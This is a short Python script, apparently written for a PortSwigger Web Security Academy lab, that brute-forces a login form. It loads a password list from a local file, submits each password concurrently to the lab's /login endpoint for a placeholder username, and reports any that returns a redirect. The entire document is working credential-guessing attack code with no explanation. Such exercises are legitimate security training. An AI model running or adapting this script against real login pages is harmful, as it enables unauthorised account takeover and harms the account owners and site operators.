python3 - <<'EOF'
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
base_url = "https://[LAB_ID].web-security-academy.net"
with open("C:/Users/malik/Downloads/passwords.txt") as f:
    passwords = [line.strip() for line in f]
def check(password):
    r = requests.post(f"{base_url}/login", data={"username": "USERNAME", "password": password}, allow_redirects=False)
    if r.status_code == 302: return f"[LOGIN SUCCESS] {password}"
with ThreadPoolExecutor(max_workers=10) as ex:
    for f in as_completed({ex.submit(check, p): p for p in passwords}):
        r = f.result()
        if r: print(r)
EOF
